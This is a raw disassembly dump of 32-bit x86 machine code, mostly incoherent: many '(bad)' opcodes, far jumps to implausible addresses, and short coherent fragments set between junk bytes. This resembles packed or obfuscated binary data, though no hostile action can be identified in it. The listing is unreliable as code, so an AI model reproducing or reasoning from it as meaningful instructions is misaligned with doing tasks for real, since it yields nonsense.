  406c55:	scas   al,BYTE PTR es:[edi]
  406c56:	adc    bl,BYTE PTR [eax]
  406c58:	pop    ebx
  406c59:	js     0x406c8a
  406c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c5c:	arpl   WORD PTR [ebx+0x13229473],di
  406c62:	add    al,0x78
  406c64:	or     BYTE PTR [ecx-0x4b20a315],0xc3
  406c6b:	jo     0x406c4c
  406c6d:	fwait
  406c6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c6f:	or     eax,ebx
  406c71:	out    0x19,al
  406c73:	adc    DWORD PTR [ecx+esi*8-0x46],esp
  406c77:	jp     0x406c89
  406c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c7a:	fnstcw WORD PTR [edx-0x11]
  406c7d:	fidivr DWORD PTR [eax+0x1518e557]
  406c83:	mov    ebp,0x42272d3d
  406c88:	adc    esi,DWORD PTR [esi-0xcb7a644]
  406c8e:	test   eax,0x95bae2e0
  406c93:	test   al,0x1f
  406c95:	mov    al,ds:0x4fa869e4
  406c9a:	add    eax,0x2943f6db
  406c9f:	das    
  406ca0:	retf   
  406ca1:	outs   dx,BYTE PTR ds:[esi]
  406ca2:	mov    edi,0x61aa22b6
  406ca7:	repnz mov ah,0x2c
  406caa:	cmp    ah,BYTE PTR [ebx+0x36]
  406cad:	stc    
  406cae:	jno    0x406c55
  406cb0:	sbb    al,0xfe
  406cb2:	mov    eax,0x9cafceca
  406cb7:	hlt    
  406cb8:	(bad)  
  406cb9:	pop    ebx
  406cba:	shl    BYTE PTR [esi+0x1e],cl
  406cbd:	and    cl,0x48
  406cc0:	(bad)  
  406cc1:	and    eax,0xe72ec1ba
  406cc6:	lahf   
  406cc7:	fwait
  406cc8:	pop    esi
  406cc9:	fdivp  st(1),st
  406ccb:	repz rcr ecx,cl
  406cce:	jp     0x406c7f
  406cd0:	pop    ds
  406cd1:	sub    edi,esi
  406cd3:	imul   BYTE PTR [esi-0x79]
  406cd6:	iret   
  406cd7:	cmp    edi,DWORD PTR [edi-0x7d]
  406cda:	mov    esi,0x8eb55d66
  406cdf:	scas   al,BYTE PTR es:[edi]
  406ce0:	xor    eax,0xd1bdb7f1
  406ce5:	xchg   edi,eax
  406ce6:	jmp    0x5c68:0x98ebfa08
  406ced:	dec    ebp
  406cee:	daa    
  406cef:	(bad)  
  406cf0:	in     al,dx
  406cf1:	aad    0x17
  406cf3:	mov    edx,0x506c1664
  406cf8:	out    0xb5,eax
  406cfa:	or     dh,ah
  406cfc:	jmp    0x50ac5322
  406d01:	not    BYTE PTR [ecx-0x71dea5c4]
  406d07:	xchg   BYTE PTR [esi+ebx*2],ah
  406d0a:	jg     0x406cbf
  406d0c:	sahf   
  406d0d:	cdq    
  406d0e:	cmp    al,0x79
  406d10:	inc    edi
  406d11:	stos   BYTE PTR es:[edi],al
  406d12:	shrd   DWORD PTR [edi-0x60],edx,0x63
  406d17:	push   ecx
  406d18:	dec    esi
  406d19:	rcr    BYTE PTR [ebx],0x2f
  406d1c:	outs   dx,DWORD PTR ds:[esi]
  406d1d:	jge    0x406d82
  406d1f:	mov    ah,0x91
  406d21:	cmp    DWORD PTR [edx+esi*8],eax
  406d24:	aaa    
  406d25:	push   ds
  406d26:	push   edi
  406d27:	lea    edx,[ecx]
  406d29:	jne    0x406d6a
  406d2b:	sub    DWORD PTR [ecx+0x1bd0c21],0x6dcf793a
  406d35:	mov    WORD PTR [esi],ds
  406d37:	loope  0x406dac
  406d39:	fwait
  406d3a:	mov    ebx,0xf1f7c649
  406d3f:	rcl    DWORD PTR [eax-0x31],1
  406d42:	sub    dh,bl
  406d44:	dec    ebx
  406d45:	sahf   
  406d46:	and    bh,0x47
  406d49:	lods   eax,DWORD PTR ds:[esi]
  406d4a:	push   ss
  406d4b:	dec    edx
  406d4c:	jns    0x406d52
  406d4e:	xchg   edi,eax
  406d4f:	ins    BYTE PTR es:[edi],dx
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x4337af,0x433693
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x4337a3,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x4336e3,0x43368f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0xf5
  406d91:	scas   eax,DWORD PTR es:[edi]
  406d92:	xor    eax,0x7e38401e
  406d97:	jle    0x406d55
  406d99:	jg     0x406e19
  406d9b:	jle    0x406dd0
  406d9d:	scas   al,BYTE PTR es:[edi]
  406d9e:	sbb    BYTE PTR [edi+0x3f],dh
  406da1:	stc    
  406da2:	(bad)  
  406da4:	mov    edi,0x64aa043d
  406da9:	xchg   edi,eax
  406daa:	and    cl,dh
  406dac:	mov    esi,0x2d02c2dc
  406db1:	outs   dx,DWORD PTR ds:[esi]
  406db2:	(bad)  
  406db3:	push   ds
  406db4:	mov    dh,0x3e
  406db6:	repz xor eax,0x9cd56d6d
  406dbc:	jg     0x406d65
  406dbe:	jbe    0x406de6
  406dc0:	mov    ds:0x94d5309f,eax
  406dc5:	cdq    
  406dc6:	fadd   st,st(6)
  406dc8:	data16 ja 0x406dad
  406dcb:	test   al,0x76
  406dcd:	cmp    dl,BYTE PTR [esi]
  406dcf:	cwde   
  406dd0:	cdq    
  406dd1:	cmp    esp,DWORD PTR [ebp-0x31]
  406dd4:	je     0x406e41
  406dd6:	sbb    eax,0x6ae77e01
  406ddb:	dec    ebx
  406ddc:	nop
  406ddd:	xor    eax,0x217675bc
  406de2:	jecxz  0x406d65
  406de4:	cld    
  406de5:	mov    eax,0x669302f9
  406dea:	jl     0x406dfe
  406dec:	cdq    
  406ded:	sbb    BYTE PTR [ecx-0x2b],bl
  406df0:	fld    DWORD PTR [edi-0x58d76ec3]
  406df6:	dec    ebx
  406df7:	pusha  
  406df8:	pop    ss
  406df9:	inc    ecx
  406dfa:	lds    eax,FWORD PTR [edx-0x9d44d7a]
  406e00:	out    0x30,al
  406e02:	cmc    
  406e03:	jns    0x406e6b
  406e05:	popf   
  406e06:	sub    eax,0x76ea62f3
  406e0b:	sub    eax,0x63e0ecbe
  406e10:	lock mov edi,0x220f6aed
  406e16:	mov    edi,0xd1b2c10b
  406e1b:	xchg   esi,eax
  406e1c:	xchg   BYTE PTR [ebp-0x1e],ah
  406e1f:	daa    
  406e20:	sar    ebx,0x9a
  406e23:	xchg   edx,eax
  406e24:	mov    cl,0xf8
  406e26:	sbb    ah,BYTE PTR [eax-0x4f]
  406e29:	rol    ebp,1
  406e2b:	bound  esi,QWORD PTR [ebx-0x7b]
  406e2e:	mov    ebp,0xb21d5ed4
  406e33:	cmc    
  406e34:	test   eax,0x602c94e8
  406e39:	cmc    
  406e3a:	rcr    DWORD PTR [ebx],0x90
  406e3d:	aas    
  406e3e:	popf   
  406e3f:	aad    0xc
  406e41:	pusha  
  406e42:	adc    BYTE PTR [ecx-0x1acb7fa],bh
  406e48:	lods   al,BYTE PTR ds:[esi]
  406e49:	xchg   BYTE PTR [eax],dh
  406e4b:	dec    DWORD PTR [ecx+0xa]
  406e4e:	mov    edi,0x4a9a5b0f
  406e53:	xchg   edx,eax
  406e54:	sbb    al,0xf5
  406e56:	(bad)  
  406e57:	xor    ah,BYTE PTR [ecx]
  406e59:	sub    edi,DWORD PTR [edx-0x2106adf]
  406e5f:	ds shl esp,0x3f
  406e63:	cli    
  406e64:	lock imul BYTE PTR [ebp+0x2b87c4c9]
  406e6b:	dec    ebx
  406e6c:	adc    eax,0x380123d2
  406e71:	push   esp
  406e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e73:	sub    DWORD PTR [esi+0xe4471a9],0x65df7649
  406e7d:	push   edx
  406e7e:	lods   al,BYTE PTR ds:[esi]
  406e7f:	(bad)  
  406e80:	ss inc ebx
  406e82:	sti    
  406e83:	pop    eax
  406e84:	(bad)  
  406e85:	repnz into 
  406e87:	retf   0xc9b8
  406e8a:	das    
  406e8b:	xor    bl,bh
  406e8d:	and    eax,0x8194fa9f
  406e92:	or     cl,bh
  406e94:	ret    
  406e95:	inc    ecx
  406e96:	sar    ebx,0xaf
  406e99:	bnd jp 0x406f18
  406e9c:	jne    0x406eda
  406e9e:	ja     0x406e89
  406ea0:	mov    ebp,0xd537b4d4
  406ea5:	test   al,0xad
  406ea7:	sti    
  406ea8:	stc    
  406ea9:	inc    ebp
  406eaa:	das    
  406eab:	int3   
  406eac:	pop    es
  406ead:	inc    edi
  406eae:	or     BYTE PTR [ecx-0x766cc62f],ah
  406eb4:	jge    0x406e81
  406eb6:	mov    al,0xfe
  406eb8:	psubb  mm2,mm6
  406ebb:	lods   al,BYTE PTR ds:[esi]
  406ebc:	and    DWORD PTR [edx],eax
  406ebe:	cmp    BYTE PTR [edi],0xe1
  406ec1:	clc    
  406ec2:	js     0x406e93
  406ec4:	cmp    al,0xb2
  406ec6:	dec    eax
  406ec7:	outs   dx,DWORD PTR ds:[esi]
  406ec8:	fisttp DWORD PTR [eax]
  406eca:	jge    0x406e93
  406ecc:	dec    ecx
  406ecd:	mov    ecx,0x5b487093
  406ed2:	cmp    eax,0xae4e4dd9
  406ed7:	cld    
  406ed8:	fwait
  406ed9:	mov    bl,0xf8
  406edb:	mov    ?,ebp
  406edd:	lds    ebx,FWORD PTR [eax+edi*8-0x5e246202]
  406ee4:	mov    bl,0xcf
  406ee6:	dec    dx
  406ee8:	in     al,0x51
  406eea:	push   ss
  406eeb:	sbb    BYTE PTR [edx-0x197426b3],bl
  406ef1:	ror    esp,cl
  406ef3:	or     eax,0x15f97278
  406ef8:	loopne 0x406f30
  406efa:	test   DWORD PTR [edi-0x21e6fd3],edi
  406f00:	ins    BYTE PTR es:[edi],dx
  406f01:	fcomi  st,st(0)
  406f03:	ret    
  406f04:	dec    esi
  406f05:	mov    ah,0xba
  406f07:	xor    BYTE PTR [esi+0x3b41198e],bl
  406f0d:	enter  0x1690,0xea
  406f11:	dec    ebp
  406f12:	fwait
  406f13:	sbb    DWORD PTR [eax],0xffffff8e
  406f16:	enter  0x6202,0x1f
  406f1a:	das    
  406f1b:	repnz mov bl,0xb0
  406f1e:	xchg   edi,eax
  406f1f:	mov    ch,BYTE PTR [esp+eax*8+0x3aa2962e]
  406f26:	cmp    dh,BYTE PTR [edx]
  406f28:	inc    esi
  406f29:	nop
  406f2a:	cmp    BYTE PTR [ebx-0x7f9ab05c],ch
  406f30:	sub    esi,ecx
  406f32:	sbb    eax,0xdfc1b8dc
  406f37:	inc    esi
  406f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f39:	mov    edx,0xb42f6a99
  406f3e:	es jmp 0x3aff146f
  406f44:	mov    ebx,0x86194a6a
  406f49:	out    0xda,al
  406f4b:	scas   al,BYTE PTR es:[edi]
  406f4c:	test   BYTE PTR [ebx],bh
  406f4e:	mov    ds:0xf7c136f1,al
  406f53:	sub    ah,bl
  406f55:	mov    esi,0x236d12c4
  406f5a:	dec    eax
  406f5b:	or     eax,0xd0f7f2a8
  406f60:	and    DWORD PTR ds:0x43368f,0x4336d3
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x70dbdefa
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0x87e7e7f
  406f9f:	jecxz  0x407014
  406fa1:	(bad)  
  406fa2:	dec    BYTE PTR [ecx]
  406fa4:	mov    ds:0x69f83302,eax
  406fa9:	jb     0x406fef
  406fab:	out    dx,eax
  406fac:	xchg   esi,eax
  406fad:	into   
  406fae:	das    
  406faf:	fst    QWORD PTR [edi+0x4c948620]
  406fb5:	sub    DWORD PTR [edi-0x7c],esp
  406fb8:	into   
  406fb9:	and    BYTE PTR [ebx],cl
  406fbb:	stos   DWORD PTR es:[edi],eax
  406fbc:	xchg   BYTE PTR [ecx],al
  406fbe:	push   esi
  406fbf:	imul   ebx,eax,0x59
  406fc2:	dec    eax
  406fc4:	jmp    DWORD PTR [eax+0x11]
  406fc7:	cmp    BYTE PTR [esi],ah
  406fc9:	cmp    al,0xd6
  406fcb:	ror    ebx,0x54
  406fce:	xchg   esp,eax
  406fcf:	(bad)  
  406fd0:	xor    al,0x48
  406fd2:	retf   
  406fd3:	mov    eax,0xa04b9e33
  406fd8:	test   bh,bh
  406fda:	fbld   TBYTE PTR [eax]
  406fdc:	aam    0x11
  406fde:	in     eax,0x99
  406fe0:	push   ds
  406fe1:	or     bl,BYTE PTR [esp+eiz*4]
  406fe4:	push   eax
  406fe5:	xchg   edx,eax
  406fe6:	ins    DWORD PTR es:[edi],dx
  406fe7:	js     0x40703b
  406fe9:	xor    dl,dl
  406feb:	call   0xd9a4:0x950ed88d
  406ff2:	or     esp,DWORD PTR [edi-0x6519cd3b]
  406ff8:	retf   0x68e7
  406ffb:	jmp    0x406fc1
  406ffd:	lahf   
  406ffe:	push   ecx
  406fff:	adc    eax,0x149039c8
  407004:	imul   esi,DWORD PTR [edx-0x65],0x7d
  407008:	mov    WORD PTR [ecx],ss
  40700a:	adc    DWORD PTR ds:0x748e90ad,0x3ebb636
  407014:	add    dh,BYTE PTR [edx+0x11444ef0]
  40701a:	inc    esi
  40701b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40701c:	int    0x25
  40701e:	(bad)  
  40701f:	mov    ds:0x56745c5a,al
  407024:	fcom   DWORD PTR [ecx]
  407026:	pop    esp
  407027:	lods   eax,DWORD PTR ds:[esi]
  407028:	lea    ebx,[esi]
  40702a:	xor    DWORD PTR [edx],edi
  40702c:	bound  esp,QWORD PTR [eax+0x59675d52]
  407032:	(bad)  
  407033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407034:	sub    BYTE PTR [ecx+0x19],0x4c
  407038:	jne    0x4070b8
  40703a:	jecxz  0x407062
  40703c:	mov    esp,0x203d3879
  407041:	stos   DWORD PTR es:[edi],eax
  407042:	and    BYTE PTR [ecx-0x17],0x5
  407046:	inc    esi
  407047:	jg     0x40702e
  407049:	sub    ch,BYTE PTR [ecx-0x74]
  40704c:	(bad)  
  40704d:	mov    esi,0xcd033492
  407052:	lea    esi,[ecx-0x749d7d9]
  407058:	xchg   ebp,eax
  407059:	out    dx,eax
  40705a:	xchg   ebx,eax
  40705b:	arpl   WORD PTR [eax],dx
  40705d:	jns    0x407062
  40705f:	pop    ss
  407060:	jns    0x407088
  407062:	xacquire xchg DWORD PTR [eax-0x2d0b6e91],ebx
  407069:	scas   al,BYTE PTR es:[edi]
  40706a:	cdq    
  40706b:	or     al,0xda
  40706d:	add    BYTE PTR [eax+eiz*8],dl
  407070:	add    al,0x66
  407072:	sub    ebx,ebx
  407074:	imul   eax,ebx,0xffffffe1
  407077:	ins    BYTE PTR es:[edi],dx
  407078:	mov    edi,0xa15f36c9
  40707d:	sbb    eax,0x7d979d35
  407082:	xor    dh,dl
  407084:	xchg   dh,cl
  407086:	xchg   edi,eax
  407087:	scas   eax,DWORD PTR es:[edi]
  407088:	mov    ah,0x5e
  40708a:	arpl   WORD PTR [edi-0x3ea35eed],di
  407090:	(bad)  [ebx+0x5a]
  407093:	pop    esi
  407094:	lea    esp,[ebp+0x7d]
  407097:	addr16 dec ebx
  40709a:	dec    ebx
  40709b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40709c:	pop    edi
  40709d:	(bad)  
  40709e:	cmp    al,0xf4
  4070a0:	nop
  4070a1:	mov    bl,0x57
  4070a3:	out    0x25,eax
  4070a5:	add    dl,bh
  4070a7:	mov    ch,0x7
  4070a9:	ins    BYTE PTR es:[edi],dx
  4070aa:	dec    esp
  4070ab:	inc    esp
  4070ac:	loopne 0x407032
  4070ae:	dec    esp
  4070af:	fidivr DWORD PTR [ebx-0x1c19a939]
  4070b5:	inc    ebp
  4070b6:	(bad)  
  4070b7:	lods   eax,DWORD PTR ds:[esi]
  4070b8:	sub    al,0x7e
  4070ba:	pusha  
  4070bb:	or     ecx,ecx
  4070bd:	mov    WORD PTR [edi-0x373690e3],fs
  4070c3:	sbb    BYTE PTR [edi-0x50],dh
  4070c6:	mov    ebx,0x5c31277c
  4070cb:	inc    ebx
  4070cc:	les    ebx,FWORD PTR [eax]
  4070ce:	push   edx
  4070cf:	rcl    DWORD PTR [ecx+0x72],1
  4070d2:	or     edx,ecx
  4070d4:	es xor al,0x8d
  4070d7:	xchg   ecx,eax
  4070d8:	jnp    0x40705e
  4070da:	stos   BYTE PTR es:[edi],al
  4070db:	aas    
  4070dc:	or     al,0x7f
  4070de:	push   ebx
  4070e0:	inc    esi
  4070e1:	in     eax,dx
  4070e2:	ficomp WORD PTR ds:0x9b992cf0
  4070e8:	test   al,0x2
  4070ea:	aaa    
  4070eb:	and    dh,BYTE PTR [eax-0x1c2ff568]
  4070f1:	pop    ds
  4070f2:	push   esi
  4070f3:	add    DWORD PTR [eax+eax*2-0x14],esp
  4070f7:	(bad)  
  4070fa:	cmp    al,0xd9
  4070fc:	xor    dl,ch
  4070fe:	push   ecx
  4070ff:	adc    DWORD PTR ds:0x15c9359b,ebx
  407105:	xor    BYTE PTR [edx],bh
  407107:	mov    WORD PTR [esi-0x728181b7],ds
  40710d:	sub    edi,edi
  40710f:	mov    cl,0xfa
  407111:	mov    WORD PTR [eax],es
  407113:	add    BYTE PTR [eax+edi*8+0x6ee02dfa],0xbe
  40711b:	or     eax,0x2455f8bb
  407120:	push   ebp
  407121:	cld    
  407122:	repnz mov ds:0x69a0c46,al
  407128:	(bad)
  40712b:	sub    edx,DWORD PTR [eax+eax*8]
  40712e:	xchg   edi,eax
  40712f:	mov    ?,WORD PTR [ebx-0x6f15489a]
  407135:	call   edi
  407137:	jne    0x407123
  407139:	sar    bl,1
  40713b:	add    BYTE PTR [edx],dl
  40713d:	mov    dl,0xc4
  40713f:	pop    ecx
  407140:	popa   
  407141:	aaa    
  407142:	fild   DWORD PTR [edx]
  407144:	call   0x6a20:0x338ff59a
  40714b:	bound  esp,QWORD PTR [edx]
  40714d:	sar    DWORD PTR [edi+0x53],0x81
  407151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407152:	cdq    
  407153:	inc    edi
  407154:	loopne 0x4071a3
  407156:	xor    al,0xe8
  407158:	(bad)  
  407159:	in     al,0xf8
  40715b:	fiadd  WORD PTR [esi-0x344ff6]
  407161:	jne    0x40716b
  407163:	call   0x407353
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	inc    esp
  40717c:	sub    DWORD PTR [ebp-0x15],esi
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0x87e7e7f
  407188:	adc    dh,0xf2
  40718b:	or     esp,DWORD PTR [eax+ebp*8]
  40718e:	dec    ebx
  40718f:	pop    es
  407190:	and    dl,bh
  407192:	sbb    al,0x2d
  407194:	sub    edx,DWORD PTR [esi+0x76]
  407197:	in     eax,0xc9
  407199:	scas   al,BYTE PTR es:[edi]
  40719a:	fidivr DWORD PTR [eax+0x6f]
  40719d:	ins    BYTE PTR es:[edi],dx
  40719e:	aas    
  40719f:	inc    esi
  4071a0:	jecxz  0x407189
  4071a2:	mov    ds:0x54316201,eax
  4071a7:	ins    DWORD PTR es:[edi],dx
  4071a8:	test   BYTE PTR [edi],bh
  4071aa:	fimul  WORD PTR ds:0x44bb3e6a
  4071b0:	jae    0x407230
  4071b2:	shl    dh,0x5e
  4071b5:	loope  0x407152
  4071b7:	scas   eax,DWORD PTR es:[edi]
  4071b8:	popf   
  4071b9:	imul   eax,ebp,0x16dcf5a0
  4071bf:	jnp    0x4071fb
  4071c1:	inc    esp
  4071c2:	mov    esi,0xd2be3cfc
  4071c7:	cmp    eax,esi
  4071c9:	int    0xff
  4071cb:	inc    esi
  4071cc:	in     al,dx
  4071cd:	jae    0x407215
  4071cf:	sub    esi,DWORD PTR [eax+0x61]
  4071d2:	mov    DWORD PTR [ebp-0x71],ebp
  4071d5:	retf   0xc1ca
  4071d8:	(bad)  
  4071d9:	(bad)  
  4071db:	mov    WORD PTR [eax-0x42],es
  4071de:	mov    ebp,0xf1cbe4d8
  4071e3:	pop    esp
  4071e4:	std    
  4071e5:	push   0xd3ee6f8
  4071ea:	jge    0x4071c6
  4071ec:	clc    
  4071ed:	jae    0x4071dd
  4071ef:	pop    es
  4071f0:	jne    0x40725b
  4071f2:	iret   
  4071f3:	sub    al,0x44
  4071f5:	(bad)  
  4071f6:	and    dh,BYTE PTR [edx]
  4071f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071f9:	in     al,0x8f
  4071fb:	adc    DWORD PTR [ebp-0x69e65a2a],0x38
  407202:	xchg   ebp,eax
  407203:	mov    esp,0x33b8b80a
  407208:	mov    DWORD PTR [ecx+edi*1],ebp
  40720b:	ins    DWORD PTR es:[edi],dx
  40720c:	cmp    dh,dl
  40720e:	mov    cl,0x96
  407210:	dec    ecx
  407211:	xor    al,0xc0
  407213:	adc    esp,DWORD PTR [esi+0x13281560]
  407219:	out    0xef,al
  40721b:	jecxz  0x40722d
  40721d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40721e:	pop    ebp
  40721f:	or     BYTE PTR [edi+0x45],dh
  407222:	fmulp  st(2),st
  407224:	(bad)  
  407225:	hlt    
  407226:	mov    eax,ds:0x5b40998e
  40722b:	push   ebx
  40722c:	cmc    
  40722d:	(bad)  
  40722e:	iret   
  40722f:	dec    ebx
  407230:	enter  0x2ced,0x8
  407234:	mov    esi,0xfb3864bb
  407239:	jbe    0x4071e8
  40723b:	mov    bh,0x39
  40723d:	mul    esi
  40723f:	arpl   sp,bx
  407241:	jge    0x407265
  407243:	jno    0x4071fa
  407245:	inc    edx
  407246:	xchg   esp,eax
  407247:	jae    0x407265
  407249:	sbb    edx,ecx
  40724b:	dec    ebx
  40724c:	mov    ds:0x8d13ccdb,al
  407251:	push   edx
  407252:	push   0xd295e7e9
  407257:	imul   ebx,DWORD PTR [edx-0x2c4a36ed],0x71b6c0be
  407261:	dec    edi
  407262:	pusha  
  407263:	dec    ebp
  407264:	jne    0x4071ee
  407266:	fstp   QWORD PTR [ecx]
  407268:	stc    
  407269:	adc    ah,BYTE PTR [esp+eax*8+0x3e8ce0b2]
  407270:	xchg   edx,eax
  407271:	cdq    
  407272:	cmp    ch,BYTE PTR [esi]
  407274:	shl    DWORD PTR [ebx+0x5b],0xe4
  407278:	clc    
  407279:	dec    eax
  40727a:	gs or  al,0xa7
  40727d:	div    bl
  40727f:	scas   al,BYTE PTR es:[edi]
  407280:	jg     0x40724f
  407282:	mov    eax,0x5ca8aee5
  407287:	lds    ebp,FWORD PTR [eax]
  407289:	loopne 0x4072ad
  40728b:	mov    bl,0x0
  40728d:	mov    ecx,0xc46d70ff
  407292:	jge    0x407263
  407294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407295:	inc    ebp
  407296:	mov    bh,0xbd
  407298:	jle    0x4072c9
  40729a:	adc    eax,0xde87fa4c
  40729f:	sbb    BYTE PTR [ebp+0x7692b88f],ah
  4072a5:	out    dx,eax
  4072a6:	(bad)  
  4072a7:	imul   eax,DWORD PTR [edi],0x3
  4072aa:	and    DWORD PTR [ebp-0x4b],edi
  4072ad:	stos   DWORD PTR es:[edi],eax
  4072ae:	cmp    DWORD PTR [ecx],edi
  4072b0:	cmp    DWORD PTR [ebp+eiz*8+0x4d],0xff83d04f
  4072b8:	popa   
  4072b9:	dec    eax
  4072ba:	pop    edi
  4072bb:	popa   
  4072bc:	dec    ebx
  4072bd:	push   eax
  4072be:	hlt    
  4072bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072c0:	rol    BYTE PTR [eax+edi*4+0x7d],0x8e
  4072c5:	pop    edi
  4072c6:	xchg   edi,eax
  4072c7:	mov    bl,0xb
  4072c9:	jge    0x407257
  4072cb:	sar    BYTE PTR [ecx-0x61],1
  4072ce:	pop    fs
  4072d0:	fmul   st,st(6)
  4072d2:	iret   
  4072d3:	call   0xae10d29
  4072d8:	and    ebx,edx
  4072da:	jae    0x407301
  4072dc:	xchg   esp,eax
  4072dd:	fwait
  4072de:	xchg   DWORD PTR [edx+0x22],eax
  4072e1:	ss lock out dx,al
  4072e4:	jl     0x4072df
  4072e6:	inc    edx
  4072e7:	xchg   edi,eax
  4072e8:	les    esp,FWORD PTR [ecx+0x6e966c17]
  4072ee:	lods   al,BYTE PTR ds:[esi]
  4072ef:	hlt    
  4072f0:	pop    ds
  4072f1:	pop    eax
  4072f2:	out    0x47,eax
  4072f4:	mov    esp,0xb43493d5
  4072f9:	mov    ebp,0xd1955ab3
  4072fe:	fwait
  4072ff:	push   es
  407300:	jnp    0x40735f
  407302:	ins    BYTE PTR es:[edi],dx
  407303:	ja     0x407331
  407305:	inc    ebp
  407306:	sbb    dh,dl
  407308:	scas   al,BYTE PTR es:[edi]
  407309:	push   es
  40730a:	jne    0x407334
  40730c:	ja     0x40736b
  40730e:	std    
  40730f:	dec    esp
  407310:	push   ecx
  407311:	in     al,0x2b
  407313:	bnd jl 0x407314
  407316:	mov    ds:0xb81475af,eax
  40731b:	jmp    0x30ee:0x4a302e79
  407322:	inc    ebp
  407324:	mov    ebx,0xa4488c91
  407329:	loope  0x40731c
  40732b:	popa   
  40732c:	pop    ecx
  40732d:	scas   al,BYTE PTR es:[edi]
  40732e:	sbb    eax,0x2f655468
  407333:	dec    edx
  407334:	push   ebx
  407335:	or     eax,0xf0956c8
  40733a:	stos   DWORD PTR es:[edi],eax
  40733b:	adc    al,0xf6
  40733d:	sub    esi,DWORD PTR [esi+0x16]
  407340:	or     al,0xff
  407342:	push   0x53
  407344:	add    DWORD PTR [ebx+0xff2c5ed],ebp
  40734a:	test   BYTE PTR [edi],ah
  40734c:	cld    
  40734d:	(bad)  
  40734e:	dec    ecx
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x4336d7,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x4337ab
  40736f:	or     DWORD PTR ds:0x4337af,eax
  407375:	jmp    0x40759d
  40737a:	pop    edx
  40737b:	cmp    al,0x59
  40737d:	inc    ebx
  40737e:	pop    ecx
  40737f:	arpl   WORD PTR [eax-0x1b],sp
  407382:	js     0x407389
  407384:	push   esi
  407385:	loope  0x40735c
  407387:	outs   dx,BYTE PTR ds:[esi]
  407388:	and    BYTE PTR [edx+0xa],ah
  40738b:	ret    0x7e7e
  40738e:	add    eax,0x507e7e7c
  407393:	test   BYTE PTR gs:[edx],dl
  407396:	aad    0x8d
  407398:	pop    ebp
  407399:	jecxz  0x4073a7
  40739b:	cmp    ch,ah
  40739d:	or     al,0xf6
  40739f:	repnz out 0x68,al
  4073a2:	loopne 0x4073d9
  4073a4:	sar    DWORD PTR [edx-0xdbfe248],cl
  4073aa:	dec    esi
  4073ab:	pop    edx
  4073ac:	push   edi
  4073ad:	xlat   BYTE PTR ds:[ebx]
  4073ae:	lock jmp 0xd7fd:0x4d1e53ee
  4073b6:	rcr    edx,cl
  4073b8:	xor    bh,BYTE PTR [edx-0x4c34895a]
  4073be:	fcom   DWORD PTR [ebx-0x30]
  4073c1:	in     al,dx
  4073c2:	outs   dx,DWORD PTR ds:[esi]
  4073c3:	xchg   ecx,eax
  4073c4:	push   edx
  4073c5:	ret    
  4073c6:	(bad)  
  4073c7:	dec    ebx
  4073c8:	cdq    
  4073c9:	clc    
  4073ca:	jae    0x4073b6
  4073cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073cd:	mov    eax,0xfcbca05
  4073d2:	arpl   WORD PTR ds:0xbd3eb63c,cx
  4073d8:	and    eax,0xfdc28ef2
  4073dd:	push   ebx
  4073de:	or     al,0xa5
  4073e0:	mov    ch,0x55
  4073e2:	mov    ds:0x4b72978a,al
  4073e7:	lods   al,BYTE PTR ds:[esi]
  4073e8:	mov    edx,0xa45c639a
  4073ed:	arpl   WORD PTR [edi],cx
  4073ef:	arpl   WORD PTR [esi],sp
  4073f1:	xchg   BYTE PTR [ecx+0x458c193],bl
  4073f7:	sti    
  4073f8:	(bad)  
  4073fa:	in     eax,0xc9
  4073fc:	jae    0x4073e7
  4073fe:	scas   al,BYTE PTR es:[edi]
  4073ff:	cli    
  407400:	jne    0x4073e9
  407402:	retf   
  407403:	scas   eax,DWORD PTR es:[edi]
  407404:	pop    esi
  407405:	push   0x1d
  407407:	das    
  407408:	scas   eax,DWORD PTR es:[edi]
  407409:	leave  
  40740a:	data16 sbb cl,bh
  40740d:	fistp  QWORD PTR [edi]
  40740f:	or     ebp,DWORD PTR [ebp-0x67]
